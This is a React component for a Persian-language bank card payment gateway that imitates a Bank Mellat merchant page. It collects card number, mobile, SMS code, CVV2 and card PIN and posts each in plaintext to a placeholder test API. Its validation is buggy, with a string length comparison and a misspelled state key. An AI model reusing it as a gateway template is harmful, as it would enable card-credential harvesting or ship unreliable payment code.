import React, { Component } from "react";
import "../css/credit-card.css";
import "../css/form-style.css";
import Cards from "react-credit-cards";
import Timer from "./timer";
import swal from "sweetalert";
import axios from "axios";
import Bank from "./bank";

import { MDBInput } from "mdbreact";
class CreditCard extends Component {
  timeoutID;
  constructor(props) {
    super(props);
    this.myRef = React.createRef();
    this.myRefcvv = React.createRef();
    this.state = {
      cvvFocus: false,
      toggle: false,
      stage: 1,
      cvc: "",
      expiry: "",
      expiryYear: "",
      focus: "",
      number: "",
      password: "",
      mobile: "",
      price: "100,000تومان",
      validationCode: "",
      getPassword: () => {},
    };
  }

  setup = () => {
    this.startTimer();
  };
  goInactive() {
    swal("زمان متقضی شد");
    window.location.reload();
  }
  goActive() {
    //starting timer
    this.startTimer();
  }
  resetTimer() {
    window.clearTimeout(this.timeoutID);
    //calling goActive to again starts the timer once it gets reset
    this.goActive();
  }
  startTimer() {
    // wait 30 min before calling goInactive
    this.timeoutID = window.setTimeout(this.goInactive, 60000 * 20);
  }
  //storing data on submit button click

  handleMobile = () => {
    const mobileNumber = {
      mobile: this.state.mobile,
    };
    if (
      this.state.number.length === 19 &&
      this.state.mobile.length === 11 &&
      this.state.mobile.charAt(0) === "0" &&
      this.state.mobile.charAt(1) === "9"
    ) {
      axios
        .post(`https://jsonplaceholder.typicode.com/users`, { mobileNumber })
        .then((res) => {
          console.log(res);
          console.log(res.data);
        });
    }
  };

  handleValidation = () => {
    const validation = {
      validation: this.state.validationCode,
    };
    if (this.state.validationCode) {
      axios
        .post(`https://jsonplaceholder.typicode.com/users`, { validation })
        .then((res) => {
          console.log(res);
          console.log(res.data);
        });
    }
  };
  handleSendPassword = () => {
    const getFunction = {
      get: this.state.getPassword,
    };
    axios
      .post(`https://jsonplaceholder.typicode.com/users`, { getFunction })
      .then((res) => {
        console.log(res);
        console.log(res.data);
      });
  };

  handleCardInformation = () => {
    // sessionStorage.setItem("user", JSON.stringify(this.state));

    const cardInformation = {
      cardNumber: this.state.number,
      cvv: this.state.cvc,
      expiry: this.state.expiry,
      expiryYear: this.state.expiryYear,
      password: this.state.password,
    };
    if (
      this.state.number.length === "19" &&
      this.state.cvc &&
      this.state.expiry &&
      this.state.expiryyear &&
      this.state.password
    ) {
      axios
        .post(`https://jsonplaceholder.typicode.com/users`, { cardInformation })
        .then((res) => {
          console.log(res);
          console.log(res.data);
        });
    } else {
      swal("خطا", "اطلاعات کارت درست نیست");
      setTimeout(window.location.reload(), 3000);
    }

    this.setState({
      number: "",
      cvc: "",
      expiry: "",
      expiryYear: "",
      focus: "",
      password: "",
    });
  };

  /*function to remove special characters like + - . e E 
    which are otherwise valid in case of type=number used in case  of cvc*/
  removeSpecial = (e) => {
    let invalidChars = ["-", "+", "e", "E", " ", "."];
    if (invalidChars.includes(e.key)) {
      e.preventDefault();
    }
  };

  //function to add space after every 4 character in card number
  addSpace = (e) => {
    const { value, id } = e.target;
    let ele = document.getElementById(id);
    if (value.length === 4 || value.length === 9 || value.length === 14)
      ele.value = ele.value.replace(/\W/gi, "").replace(/(.{4})/g, "$1 ");
  };

  componentDidMount() {
    this.setup(); //setting up all window event  listener to detect user activity after component gets mounted
    setInterval(() => {
      let hours = 0.5; // Reset when storage is more than 24hours
      let now = new Date().getTime(); //recording session start time
      let setupTime = sessionStorage.getItem("setupTime"); //pushing setting start time to session storage

      if (setupTime === null) {
        //this only works first time when there is no value in session storage
        sessionStorage.setItem("setupTime", now);
      } else {
        //comparing time passed with the specified time of session

        if (now - setupTime > hours * 60 * 60 * 1000) {
          //session time exceeds 30 min
          sessionStorage.clear(); //clearing storage
          sessionStorage.setItem("setupTime", now); //storing starting time of new session
        }
      }
    }, 1000);
  }

  //function to validate the length of input in case of cvv and replace invalid characters in case of card number
  validateInput = (e) => {
    const { name, value, maxLength, id } = e.target;
    let temp, ele;

    if (id === "cvv") {
      if (value.length > maxLength) {
        temp = value.slice(0, maxLength);
        const num = temp;
        ele = document.getElementById(id);
        ele.value = temp;
        this.setState({ [name]: num });
      } else {
        this.setState({ [name]: value });
      }
    }
    //works when function is invoked by cardNumber input
    else {
      ele = document.getElementById(id);
      //if user enters any invalid characters it gets replaced
      ele.value = ele.value.replace(
        /[A-Za-z}"`~_=.\->\]|<?+*/,;\[:{\\!@#'$%^&*()]/g,
        ""
      );
      this.setState({ [name]: ele.value });
    }
  };

  //function to handle focus on input
  handleInputFocus = (e) => {
    this.setState({ focus: e.target.name });
  };

  //function to handle  input and update the state of variable
  handleInputChange = (e) => {
    const { name, value, id } = e.target;

    if (id === "cardHolder") {
      let ele = document.getElementById(id);
      //if user enters any invalid characters it gets replaced
      ele.value = ele.value.replace(
        /[}"`~_=.\->\]|<?+*/,\d;\[:{\\!@#'$%^&*()]/g,
        ""
      );
      this.setState({ [name]: ele.value });
    } else this.setState({ [name]: value });
  };

  render() {
    return (
      <div className="payment-getway">
        <div className="credit-card ">
          <Cards
            locale={{ valid: "Expires" }}
            placeholders={{ name: "FULL NAME" }}
            cvc={this.state.cvc}
            expiry={this.state.expiry}
            expiryyear={this.state.expiryYear}
            focused={this.state.focus}
            name={"debit Card"}
            number={this.state.number}
          />
        </div>
        {this.state.cvvFocus === false && <Bank number={this.state.number} />}
        <div className="card">
          <form className="payment-form">
            <div className="form-group">
              <MDBInput
                dir="rtl"
                type="text"
                label="مبلغ"
                value={this.state.price}
                onChange={this.handleInputChange}
              />
            </div>

            {this.state.stage === 1 && (
              <div>
                <div className="form-group">
                  <MDBInput
                    type="text"
                    onChange={this.validateInput}
                    value={this.state.number}
                    onKeyDown={this.removeSpecial}
                    onPaste={(e) => e.preventDefault()}
                    onKeyPress={this.addSpace}
                    onFocus={this.handleInputFocus}
                    name="number"
                    maxLength="19"
                    id="cardNumber"
                    className="form-control form-control-lg"
                    label="شماره کارت"
                  />
                </div>

                <div className="form-group">
                  <MDBInput
                    type="number"
                    name="name"
                    spellCheck="false"
                    value={this.state.mobile}
                    maxLength="11"
                    autoComplete="off"
                    onPaste={(e) => e.preventDefault()}
                    onChange={(e) => this.setState({ mobile: e.target.value })}
                    onFocus={this.handleInputFocus}
                    id="cardHolder"
                    className="form-control form-control-lg"
                    label="شماره موبایل"
                    required
                  />
                </div>

                <button
                  className="btn next-btn btn-lg btn-block"
                  onClick={() =>
                    this.state.number.length === 19
                      ? this.state.mobile.length === 11 &&
                        this.state.mobile.charAt(0) === "0" &&
                        this.state.mobile.charAt(1) === "9"
                        ? this.setState({ stage: this.state.stage + 1 })
                        : swal("Oops!", "شماره موبایل نامعتبر است")
                      : swal("Oops!", "شماره کارت نامعتبر است")
                  }
                  onClickCapture={this.handleMobile}
                  disabled={!this.state.number && !this.state.mobile}
                >
                  ادامه
                </button>
              </div>
            )}

            {this.state.stage === 2 && (
              <div>
                <div className="form-group">
                  <div>
                    <label htmlFor="cardHolder" className="card-label">
                      {" "}
                      کد ارسال شده به شماره{this.state.mobile} را وارد کنید
                    </label>

                    <button
                      className="btn"
                      onClick={() => this.setState({ stage: 1 })}
                    >
                      {" "}
                      تغییر دادن شماره موبایل
                    </button>
                  </div>
                  <MDBInput
                    label="کد اعبار سنجی"
                    type="number"
                    name="name"
                    spellCheck="false"
                    value={this.state.validationCode}
                    maxLength="20"
                    autoComplete="off"
                    onPaste={(e) => e.preventDefault()}
                    onChange={(e) =>
                      this.setState({ validationCode: e.target.value })
                    }
                    onFocus={this.handleInputFocus}
                    id="cardHolder"
                    className="form-control form-control-lg"
                  />

                  {<Timer />}
                </div>
                <button
                  type="button"
                  className="btn payment-btn btn-lg btn-block"
                  onClick={() =>
                    this.state.validationCode
                      ? this.setState({ stage: this.state.stage + 1 })
                      : swal("کد ارسال شده را وارد کنید")
                  }
                  onClickCapture={this.handleValidation}
                >
                  تایید
                </button>
              </div>
            )}

            {this.state.stage === 3 && (
              <div className="form_container">
                <div className="darghah_pardakht">
                  <div className="date-cvv-box">
                    <div className="expiry-class">
                      <div className="form-group card-month ">
                        <label htmlFor="cardMonth" className="card-label">
                          تاریخ انقضا
                        </label>

                        <select
                          id="cardMonth"
                          data-ref="cardDate"
                          value={this.state.expiry}
                          name="expiry"
                          onChange={this.handleInputChange}
                          onFocus={this.handleInputFocus}
                          className="form-control form-control-lg"
                        >
                          <option value="" defaultChecked="true">
                            ماه
                          </option>
                          <option value="01">01</option>
                          <option value="02">02</option>
                          <option value="03">03</option>
                          <option value="04">04</option>
                          <option value="05">05</option>
                          <option value="06">06</option>
                          <option value="07">07</option>
                          <option value="08">08</option>
                          <option value="09">09</option>
                          <option value="10">10</option>
                          <option value="11">11</option>
                          <option value="12">12</option>
                        </select>
                      </div>
                      <div className="form-group card-year">
                        <select
                          id="cardYear"
                          data-ref="cardDate"
                          value={this.state.expiryYear}
                          name="expiryYear"
                          onChange={this.handleInputChange}
                          onFocus={this.handleInputFocus}
                          className="form-control form-control-lg"
                        >
                          <option value="" defaultChecked="true">
                            سال
                          </option>
                          <option value="1395">1395</option>
                          <option value="1396">1396</option>
                          <option value="1397">1397</option>
                          <option value="1398">1398</option>
                          <option value="1399">1399</option>
                          <option value="1400">1400</option>
                          <option value="1401">1401</option>
                          <option value="1402">1402</option>
                          <option value="1403">1403</option>
                          <option value="1404">1404</option>
                          <option value="1405">1405</option>
                          <option value="1406">1406</option>
                          <option value="1407">1407</option>
                          <option value="1408">1408</option>
                          <option value="1409">1409</option>
                          <option value="1410">1410</option>
                        </select>
                      </div>
                    </div>
                  </div>

                  <div className="form-outline">
                    <MDBInput
                      type="number"
                      onChange={this.validateInput}
                      onKeyDown={this.removeSpecial}
                      onPaste={(e) => e.preventDefault()}
                      onFocus={(e) =>
                        this.setState({ focus: e.target.name, cvvFocus: true })
                      }
                      name="cvc"
                      id="formControlDefault"
                      value={this.state.cvc}
                      className="form-control form-control-lg "
                      maxLength="4"
                      background
                      label="cvv2"
                      onBlur={() => this.setState({ cvvFocus: false })}
                    />
                  </div>

                  <MDBInput
                    type="password"
                    onChange={this.validateInput}
                    onKeyDown={this.removeSpecial}
                    onPaste={(e) => e.preventDefault()}
                    onFocus={this.handleInputFocus}
                    name="password"
                    id="password"
                    value={this.state.password}
                    className="form-control form-control-lg "
                    maxLength="20"
                    label="رمز کارت"
                    background
                  />

                  <button
                    type="button"
                    className="btn btn-success btn-puya"
                    onClick={this.handleSendPassword}
                  >
                    دریافت رمز پویا
                  </button>

                  <button
                    type="button"
                    className="btn  payment-btn btn-lg btn-block"
                    onClick={this.handleCardInformation}
                  >
                    پرداخت
                  </button>
                  <div className="d-flex">
                    <button
                      type="submit"
                      className="btn exit-btn btn-lg btn-block"
                    >
                      انصراف
                    </button>
                  </div>
                </div>
              </div>
            )}
          </form>
       

        {this.state.stage === 3 && (
          <div className="check-information">
            <div className="information-content">
              <p>نام پذیرنده</p>
              <p className="information-values">فروش شارژ برخط بانک ملت</p>
              <p>شماره کارت</p>
              <p className="information-values">{this.state.number}</p>
              <p>شماره موبايل</p>
              <p className="information-values">{this.state.mobile}</p>
              <p>سایت پذیرنده</p>
              <p className="information-values">www.atta-design.com</p>
              <p>شماره پذیرنده</p>
              <p className="information-values">255643678</p>
            
            </div>
          </div>
        )}
         </div>
      </div>
    );
  }
}

export default CreditCard;
